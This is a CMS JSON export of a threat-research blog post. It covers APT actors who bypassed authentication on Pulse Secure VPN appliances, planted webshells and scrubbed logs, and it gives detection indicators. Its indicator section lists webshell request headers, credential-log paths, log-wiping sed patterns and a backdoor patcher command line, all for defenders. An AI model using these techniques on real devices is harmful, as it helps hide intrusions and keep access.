{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "admin",
  "jcr:created": "Tue Apr 20 2021 14:02:21 GMT+0000",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "admin",
    "jcr:title": "Check Your Pulse: Suspected APT Actors Leverage Authentication Bypass Techniques and Pulse Secure Zero-Day",
    "twitterSize": "small",
    "jcr:versionHistory": "5ac036db-faf0-445f-8fa5-6707349f78f0",
    "author": "Dan Perez",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "jcr:language": "en_us",
    "jcr:predecessors": [
      "bf77e797-a18c-4c8c-9df4-db74486b5307"
    ],
    "jcr:created": "Mon May 10 2021 16:35:01 GMT+0000",
    "cq:lastModified": "Mon May 10 2021 16:34:49 GMT+0000",
    "jcr:baseVersion": "bf77e797-a18c-4c8c-9df4-db74486b5307",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-blog-authors:dan-perez",
      "fireeye-blog-authors:sarah-jones",
      "fireeye-blog-authors:greg-wood",
      "fireeye-blog-authors:stephen-eckels",
      "fireeye-blog-threat-research:threat-research",
      "fireeye-blog-tags:homepage-carousel",
      "fireeye-blog-tags:latest",
      "fireeye-blog-tags:vulnerabilities",
      "fireeye-blog-tags:TTPs",
      "fireeye-blog-tags:bypass",
      "fireeye-blog-tags:malware",
      "fireeye-blog-tags:persistence"
    ],
    "jcr:uuid": "2c72f3d8-54bc-4933-96fc-3f71147f4980",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Tue Apr 20 2021 10:00:00 GMT-0400",
    "cq:lastModifiedBy": "adam.greenberg@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
        "text": "\u003Ch4\u003EExecutive Summary\u003C\/h4\u003E\n\u003Cul\u003E\n\u003Cli\u003EMandiant recently responded to multiple security incidents involving compromises of Pulse Secure VPN appliances.\u003C\/li\u003E\n\u003Cli\u003EThis blog post examines multiple, related techniques for bypassing single and multifactor authentication on Pulse Secure VPN devices, persisting across upgrades, and maintaining access through webshells.\u003C\/li\u003E\n\u003Cli\u003EThe investigation by Pulse Secure has determined that a combination of prior vulnerabilities and a previously unknown vulnerability discovered in April 2021, \u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/kb.pulsesecure.net\/articles\/Pulse_Security_Advisories\/SA44784\/\u0022\u003ECVE-2021-22893\u003C\/a\u003E, are responsible for the initial infection vector.\u003C\/li\u003E\n\u003Cli\u003EPulse Secure\u2019s parent company, Ivanti, released mitigations for a vulnerability exploited in relation to these malware families and the \u003Ca href=\u0022https:\/\/kb.pulsesecure.net\/articles\/Pulse_Secure_Article\/KB44755\u0022\u003EPulse Connect Secure Integrity Tool\u003C\/a\u003E for their customers to determine if their systems are impacted. A final patch to address the vulnerability will be available in early May 2021.\u003C\/li\u003E\n\u003Cli\u003EPulse Secure has been working closely with Mandiant, affected customers, government partners, and other forensic experts to address these issues.\u003C\/li\u003E\n\u003Cli\u003EThere is no indication the identified backdoors were introduced through a supply chain compromise of the company\u2019s network or software deployment process.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch4\u003EIntroduction\u003C\/h4\u003E\n\u003Cp\u003EMandiant is currently tracking 12 malware families associated with the exploitation of Pulse Secure VPN devices. These families are related to the circumvention of authentication and backdoor access to these devices, but they are not necessarily related to each other and have been observed in separate investigations. It is likely that multiple actors are responsible for the creation and deployment of these various code families.\u003C\/p\u003E\n\u003Cp\u003EThe focus of this report is on the activities of UNC2630 against U.S. Defense Industrial base (DIB) networks, but detailed malware analysis and detection methods for all samples observed at U.S. and European victim organizations are provided in the technical annex to assist network defenders in identifying a large range of malicious activity on affected appliances. Analysis is ongoing to determine the extent of the activity.\u003C\/p\u003E\n\u003Cp\u003EMandiant continues to collaborate with the Ivanti and Pulse Secure teams, Microsoft Threat Intelligence Center (MSTIC), and relevant government and law enforcement agencies to investigate the threat, as well as develop recommendations and mitigations for affected Pulse Secure VPN appliance owners.\u003C\/p\u003E\n\u003Cp\u003EAs part of their investigation, Ivanti has released mitigations for a vulnerability exploited in relation to this campaign as well as the \u003Ca href=\u0022https:\/\/kb.pulsesecure.net\/articles\/Pulse_Secure_Article\/KB44755\u0022\u003EPulse Connect Secure Integrity Tool\u003C\/a\u003E to assist with determining if systems have been impacted.\u003C\/p\u003E\n\u003Ch4\u003EDetails\u003C\/h4\u003E\n\u003Cp\u003EEarly this year, Mandiant investigated multiple intrusions at defense, government, and financial organizations around the world. In each intrusion, the earliest evidence of attacker activity traced back to DHCP IP address ranges belonging to Pulse Secure VPN appliances in the affected environment.\u003C\/p\u003E\n\u003Cp\u003EIn many cases, we were not able to determine how actors obtained administrator-level access to the appliances. However, based on analysis by Ivanti, we suspect some intrusions were due to the exploitation of previously disclosed Pulse Secure vulnerabilities from 2019 and 2020 while other intrusions were due to the exploitation of \u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/kb.pulsesecure.net\/articles\/Pulse_Security_Advisories\/SA44784\/\u0022\u003ECVE-2021-22893\u003C\/a\u003E.\u003C\/p\u003E\n\u003Cp\u003EWe observed UNC2630 harvesting credentials from various Pulse Secure VPN login flows, which ultimately allowed the actor to use legitimate account credentials to move laterally into the affected environments. In order to maintain persistence to the compromised networks, the actor utilized legitimate, but modified, Pulse Secure binaries and scripts on the VPN appliance. This was done to accomplish the following:\u003C\/p\u003E\n\u003Col\u003E\n\u003Cli\u003ETrojanize shared objects with malicious code to log credentials and bypass authentication flows, including multifactor authentication requirements. We track these trojanized assemblies as SLOWPULSE and its variants.\u003C\/li\u003E\n\u003Cli\u003EInject webshells we currently track as RADIALPULSE and PULSECHECK into legitimate Internet-accessible Pulse Secure VPN appliance administrative web pages for the devices.\u003C\/li\u003E\n\u003Cli\u003EToggle the filesystem between Read-Only and Read-Write modes to allow for file modification on a typically Read-Only filesystem.\u003C\/li\u003E\n\u003Cli\u003EMaintain persistence across VPN appliance general upgrades that are performed by the administrator.\u003C\/li\u003E\n\u003Cli\u003EUnpatch modified files and delete utilities and scripts after use to evade detection.\u003C\/li\u003E\n\u003Cli\u003EClear relevant log files utilizing a utility tracked as THINBLOOD based on an actor defined regular expression.\u003C\/li\u003E\n\u003C\/ol\u003E\n\u003Cp\u003EIn a separate incident in March 2021, we observed UNC2717 using RADIALPULSE, PULSEJUMP, and HARDPULSE at a European organization. Although we did not observe PULSEJUMP or HARDPULSE used by UNC2630 against U.S. DIB companies, these malware families have shared characteristics and serve similar purposes to other code families used by UNC2630. We also observed an OpenSSL library file modified in similar fashion as the other trojanized shared objects. We believe that the modified library file, which we\u2019ve named LOCKPICK, could weaken encryption for communications used by the appliance, but do not have enough evidence to confirm this.\u003C\/p\u003E\n\u003Cp\u003EDue to a lack of context and forensic evidence at this time, Mandiant cannot associate all the code families described in this report to UNC2630 or UNC2717. We also note the possibility that one or more related groups is responsible for the development and dissemination of these different tools across loosely connected APT actors. It is likely that additional groups beyond UNC2630 and UNC2717 have adopted one or more of these tools. Despite these gaps in our understanding, we included detailed analysis, detection techniques, and mitigations for all code families in the Technical Annex.\u003C\/p\u003E\n\u003Ch4\u003ESLOWPULSE\u003C\/h4\u003E\n\u003Cp\u003EDuring our investigation into the activities of UNC2630, we uncovered a novel malware family we labeled SLOWPULSE. This malware and its variants are applied as modifications to legitimate Pulse Secure files to bypass or log credentials in the authentication flows that exist within the legitimate Pulse Secure shared object \u003Cspan class=\u0022code\u0022\u003Elibdsplibs.so\u003C\/span\u003E. Three of the four discovered variants enable the attacker to bypass two-factor authentication. A brief overview of these variants is covered in this section, refer to the Technical Annex for more details.\u003C\/p\u003E\n\u003Ch5\u003ESLOWPULSE Variant 1\u003Ci\u003E\u003C\/i\u003E\u003C\/h5\u003E\n\u003Cp\u003EThis variant is responsible for bypassing LDAP and RADIUS-2FA authentication routines if a secret backdoor password is provided by the attacker. The sample inspects login credentials used at the start of each protocol\u2019s associated routine and strategically forces execution down the successful authentication patch if the provided password matches the attacker\u0027s chosen backdoor password.\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003ELDAP Auth Bypass\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EThe routine \u003Cspan class=\u0022code\u0022\u003EDSAuth::LDAPAuthServer::authenticate\u003C\/span\u003E begins the LDAP authentication procedure. This variant inserts a check against the backdoor password after the bind routine so that the return value can be conditionally stomped to spoof successful authentication.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/pulse-secure\/fig1.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 1: LDAP Auth Bypass\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003ERADIUS Two Factor Auth Bypass\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EThe routine \u003Cspan class=\u0022code\u0022\u003EDSAuth::RadiusAuthServer::checkUsernamePassword\u003C\/span\u003E begins the RADIUS-2FA authentication procedure. This variant inserts checks against the backdoor password after the RADIUS authentication packet is received back from the authentication server. If the backdoor password is provided by the attacker, the packet type and successful authentication status flags are overwritten to spoof successful authentication.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/pulse-secure\/fig2a.png\u0022 alt=\u0022\u0022\u003E\u003Cspan class=\u0022type-XS\u0022\u003E\u003Cbr\u003E\nFigure 2: Radius-2FA Bypass\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003ESLOWPULSE Variant 2\u003C\/h5\u003E\n\u003Cp\u003E\u003Ci\u003EACE Two Factor Auth Credential Logging\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EThis variant logs credentials used during the ACE-2FA authentication procedure \u003Cspan class=\u0022code\u0022\u003EDSAuth::AceAuthServer::checkUsernamePassword\u003C\/span\u003E. Rather than bypassing authentication, this variant logs the username and password to a file for later use by the attacker.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/pulse-secure\/fig3.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 3: ACE Auth Credential Log\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003ESLOWPULSE Variant 3\u003C\/h5\u003E\n\u003Cp\u003E\u003Ci\u003EACE Two Factor Auth Bypass\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EThis variant is responsible for bypassing the ACE-2FA logon procedure starting with \u003Cspan class=\u0022code\u0022\u003EDSAuth::AceAuthServer::checkUsernamePassword\u003C\/span\u003E. The flow of the authentication procedure is modified to bypass the routine responsible for verifying the username and password if the backdoor password is provided. With this modification the attacker can spoof successful authentication.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/pulse-secure\/fig4.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 4: ACE Auth Bypass Variant\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003ESLOWPULSE Variant 4\u003C\/h5\u003E\n\u003Cp\u003E\u003Ci\u003ERealmSignin Two Factor Auth Bypass\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EThis variant bypasses the \u003Cspan class=\u0022code\u0022\u003ERealmSignin::runSecondaryAuth\u003C\/span\u003E procedure of the Pulse Secure VPN. The inserted logic modifies the execution flow of a specific step of the login process to spoof successful authentication. We believe that this may be a two-factor authentication bypass.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/pulse-secure\/fig5.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 5: RealmSignIn 2FA Auth Bypass\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EAttribution\u003C\/h4\u003E\n\u003Cp\u003EWe are in the early stages of gathering evidence and making attribution assessments and there are a number of gaps in our understanding of UNC2630, UNC2717, and these 12 code families. Nevertheless, the Mandiant and Ivanti teams are proactively releasing this analysis to assist network defenders in triaging and identifying malicious activity on affected appliances.\u003C\/p\u003E\n\u003Cp\u003EMandiant is able to assess that:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EUNC2630 targeted U.S. DIB companies with SLOWPULSE, RADIALPULSE, THINBLOOD, ATRIUM, PACEMAKER, SLIGHTPULSE, and PULSECHECK as early as August 2020 until March 2021.\u003Cul\u003E\n\u003Cli\u003EWe suspect UNC2630 operates on behalf of the Chinese government and may have ties to APT5\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003EUNC2717 targeted global government agencies between October 2020 and March 2021 using HARDPULSE, QUIETPULSE, AND PULSEJUMP.\u003Cul\u003E\n\u003Cli\u003EWe do not have enough evidence about UNC2717 to determine government sponsorship or suspected affiliation with any known APT group.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003EWe do not have enough information about the use of LOCKPICK to make an attribution statement.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch5\u003EUNC2630\u003C\/h5\u003E\n\u003Cp\u003EUNC2630\u2019s combination of infrastructure, tools, and on-network behavior appear to be unique, and we have not observed them during any other campaigns or at any other engagement. Despite these new tools and infrastructure, Mandiant analysts noted strong similarities to historic intrusions dating back to 2014 and 2015 and conducted by Chinese espionage actor APT5. We have also uncovered limited evidence to suggest that UNC2630 operates on behalf of the Chinese government. Analysis is still ongoing to determine the full scope of the activity that maybe related to the group.\u003C\/p\u003E\n\u003Cp\u003EAlthough we are not able to definitively connect UNC2630 to APT5, or any other existing APT group, a trusted third party has uncovered evidence connecting this activity to historic campaigns which Mandiant tracks as Chinese espionage actor APT5. While we cannot make the same connections, the third party assessment is consistent with our understanding of APT5 and their historic TTPs and targets.\u003C\/p\u003E\n\u003Cp\u003EAPT5 has shown significant interest in compromising networking devices and manipulating the underlying software which supports these appliances. They have also consistently targeted defense and technology companies in the U.S., Europe, and Asia.\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EAs early as 2014, Mandiant Incident Response discovered APT5 making unauthorized code modifications to files in the embedded operating system of another technology platform.\u003C\/li\u003E\n\u003Cli\u003EIn 2015, APT5 compromised a U.S. telecommunications organization providing services and technologies for private and government entities. During this intrusion, the actors downloaded and modified some of the router images related to the company\u2019s network routers.\u003C\/li\u003E\n\u003Cli\u003EAlso during this time, APT5 stole files related to military technology from a South Asian defense organization. Observed filenames suggest the actors were interested in product specifications, emails concerning technical products, procurement bids and proposals, and documents on unmanned aerial vehicles (UAVs).\u003C\/li\u003E\n\u003Cli\u003EAPT5 persistently targets high value corporate networks and often re-compromises networks over many years. Their primary targets appear to be aerospace and defense companies located in the U.S., Europe, and Asia. Secondary targets (used to facilitate access to their primary targets) include network appliance manufacturers and software companies usually located in the U.S.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch4\u003ERecommendations\u003C\/h4\u003E\n\u003Cp\u003EAll Pulse Secure Connect customers should assess the impact of the Pulse Secure mitigations and apply it if possible. Organizations should utilize the most recent version of Pulse Secure\u2019s Integrity Assurance utility \u003Ca href=\u0022https:\/\/kb.pulsesecure.net\/articles\/Pulse_Secure_Article\/KB44755\u0022\u003Ereleased\u003C\/a\u003E on March 31, 2021. If a device fails this Integrity Assurance utility, network administrators should follow the \u003Ca href=\u0022https:\/\/kb.pulsesecure.net\/articles\/Pulse_Secure_Article\/KB44755\u0022\u003Einstructions here\u003C\/a\u003E and contact their Pulse CSR for additional guidance.\u003C\/p\u003E\n\u003Cp\u003EOrganizations should examine available forensic evidence to determine if an attacker compromised user credentials. Ivanti highly recommends resetting all passwords in the environment and reviewing the configuration to ensure no service accounts can be used to authenticate to the vulnerability.\u003C\/p\u003E\n\u003Cp\u003EAdditional detections, mitigations and relevant MITRE ATT\u0026amp;CK techniques are included in the Technical Annex. Sample hashes and analysis are included to enable defenders to quickly assess if their respective appliances have been affected. Yara rules, Snort rules, and hashes are published on \u003Ca adhocenable=\u0022false\u0022 href=\u0022https:\/\/github.com\/fireeye\/pulsesecure_exploitation_countermeasures\/\u0022\u003EMandiant\u2019s GitHub page\u003C\/a\u003E.\u003C\/p\u003E\n\u003Ch4\u003EDetections and Mitigations\u003C\/h4\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E1d3ab04e21cfd40aa8d4300a359a09e3b520d39b1496be1e4bc91ae1f6730ecc\u003C\/span\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EHARDPULSE contains an embedded \u0027recovery\u0027 URL \u003Cspan class=\u0022code\u0022\u003Ehttps:\/\/ive-host\/dana-na\/auth\/recover[.]cgi?token=\u0026lt;varies\u0026gt;\u003C\/span\u003E that may be accessed by an attacker. The sample uses the POST parameters \u003Cspan class=\u0022code\u0022\u003Echeckcode\u003C\/span\u003E, \u003Cspan class=\u0022code\u0022\u003Ehashid\u003C\/span\u003E, \u003Cspan class=\u0022code\u0022\u003Em\u003C\/span\u003E, and \u003Cspan class=\u0022code\u0022\u003Efilename\u003C\/span\u003E. This URL is not present in legitimate versions of this file.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E7fa71a7f76ef63465cfeacf58217e0b66fc71bc81d37c44380a6f572b8a3ec7a\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ed72daafedf41d484f7f9816f7f076a9249a6808f1899649b7daa22c0447bb37b\u003C\/span\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EPULSEJUMP, RADIALPULSE AND PACEMAKER use the following files to record credentials:\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003E\/tmp\/dsactiveuser.statementcounters\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003E\/tmp\/dsstartssh.statementcounters\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003E\/tmp\/dsserver-check.statementcounters\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ecd09ec795a8f4b6ced003500a44d810f49943514e2f92c81ab96c33e1c0fbd68\u003C\/span\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EThe malicious operations of SLOWPULSE can be detected via log correlation between the authentication servers responsible for LDAP and RADIUS auth and the VPN server. Authentication failures in either LDAP or RADIUS logs with the associated VPN logins showing success would be an anomalous event worthy of flagging.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ea1dcdf62aafc36dd8cf64774dea80d79fb4e24ba2a82adf4d944d9186acd1cc1\u003C\/span\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EUpon invocation of the PULSECHECK webshell, the following HTTP request headers will be sent:\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ctable border=\u00220\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022472\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022\u003E\u003Cp\u003E\u003Cb\u003EKey\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022294\u0022\u003E\u003Cp\u003E\u003Cb\u003EValue\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003EREQUEST_METHOD\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022294\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003EPOST\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003EHTTP_X_KEY\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022294\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026lt;BackdoorKey\u0026gt;\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003EHTTP_X_CNT\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022294\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026lt;RC4Key\u0026gt;\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022178\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003EHTTP_X_CMD\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022294\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026lt;RC4Command\u0026gt;\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E1ab50b77dd9515f6cd9ed07d1d3176ba4627a292dc4a21b16ac9d211353818bd\u003C\/span\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003ESLOWPULSE VARIANT 2 writes ACE logon credentials to the file\u0026nbsp;\u003Cspan class=\u0022code\u0022\u003E\/home\/perl\/PAUS.pm\u003C\/span\u003E\u0026nbsp;in\u0026nbsp;\u003Cspan class=\u0022code\u0022\u003Ea+\u003C\/span\u003E\u0026nbsp;(append) mode, using the format string\u0026nbsp;\u003Cspan class=\u0022code\u0022\u003E%s:%s\\n\u003C\/span\u003E.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2\u003C\/span\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EPACEMAKER is saved at filepath \u003Cspan class=\u0022code\u0022\u003E\/home\/bin\/memread\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003EExecuted with commandline flags \u003Cspan class=\u0022code\u0022\u003E\u2013t\u003C\/span\u003E, \u003Cspan class=\u0022code\u0022\u003E-m\u003C\/span\u003E, \u003Cspan class=\u0022code\u0022\u003E-s\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003EAttaches to victim processes with PTRACE and opens subfiles in \u003Cspan class=\u0022code\u0022\u003E\/proc\/\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E88170125598a4fb801102ad56494a773895059ac8550a983fdd2ef429653f079\u003C\/span\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003ETHINBLOOD creates the files:\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003E\/home\/runtime\/logs\/log.events.vc1\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003E\/home\/runtime\/logs\/log.events.vc2\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003E\/home\/runtime\/logs\/log.access.vc1\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003E\/home\/runtime\/logs\/log.access.vc2\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003EExecutes the \u003Cspan class=\u0022code\u0022\u003Esystem\u003C\/span\u003E API with the \u003Cspan class=\u0022code\u0022\u003Emv\u003C\/span\u003E command specifying one of the files above, targeting:\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003E\/home\/runtime\/logs\/log.access.vc0\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003E\/home\/runtime\/logs\/log.events.vc0\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003EExecutes the \u003Cspan class=\u0022code\u0022\u003Erm\u003C\/span\u003E command specify one of the \u003Cspan class=\u0022code\u0022\u003E.vc1\u003C\/span\u003E files above\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E133631957d41eed9496ac2774793283ce26f8772de226e7f520d26667b51481a\u003C\/span\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003ESLIGHTPULSE uses \u003Cspan class=\u0022code\u0022\u003E\/tmp\/1\u003C\/span\u003E as command execution log\u003C\/li\u003E\n\u003Cli\u003EAll POST requests to \u003Cspan class=\u0022code\u0022\u003Emeeting_testjs.cgi\u003C\/span\u003E are suspicious\u003C\/li\u003E\n\u003Cli\u003EPOST parameters: \u003Cspan class=\u0022code\u0022\u003Ecert\u003C\/span\u003E, \u003Cspan class=\u0022code\u0022\u003Eimg\u003C\/span\u003E, \u003Cspan class=\u0022code\u0022\u003Ename\u003C\/span\u003E are used by malicious logic\u003C\/li\u003E\n\u003Cli\u003EResponses to the endpoint with the \u003Cspan class=\u0022code\u0022\u003Ename\u003C\/span\u003E parameter respond with \u003Cspan class=\u0022code\u0022\u003Eno-cache\u003C\/span\u003E and \u003Cspan class=\u0022code\u0022\u003Eimage\/gif\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E1741dc0a491fcc8d078220ac9628152668d3370b92a8eae258e34ba28c6473b9\u003C\/span\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003ETHINBLOOD execution of sed on the files:\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Elog.events.vc0\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Elog.access.vc0\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003ELog.admin.vc0\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003ESed patterns used:\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Es\/.\\x00[^\\x00]*\u0026lt;regex_string\u0026gt;[^\\x00]*\\x09.\\x00\/\/g\u003C\/span\u003E\u003C\/li\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003Es\/\\x\u0026lt;hex_char\u0026gt;\\x00[^\\x00]*\u0026lt;regex_string\u0026gt;[^\\x00]*\\x09\\x\u0026lt;hex_char\u0026gt;\\x00\/\/g\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E06c56bd272b19bf7d7207443693cd1fc774408c4ca56744577b11fee550c23f7\u003C\/span\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EThe sample accepts an input and output file as its first and second arguments, then writes a patched version of the input out. The commandline argument e or E must be supplied as the fourth argument. Example command line:\u003Cul\u003E\n\u003Cli\u003E\u003Cspan class=\u0022code\u0022\u003E.\/patcher input.bin output.bin backdoorkey e\u003C\/span\u003E\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ef2b1bd703c3eb05541ff84ec375573cbdc70309ccb82aac04b72db205d718e90\u003C\/span\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EThe sample uses the HTTP query parameter id and responds with HTTP headers \u0026quot;Cache-Control: no-cache\\n\u0026quot; and \u0026quot;Content-type: text\/html\\n\\n\u0026quot;.\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E224b7c45cf6fe4547d3ea66a12c30f3cb4c601b0a80744154697094e73dbd450\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E64c87520565165ac95b74d6450b3ab8379544933dd3e2f2c4dc9b03a3ec570a7\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E78d7c7c9f800f6824f63a99d935a4ad0112f97953d8c100deb29dae24d7da282\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan 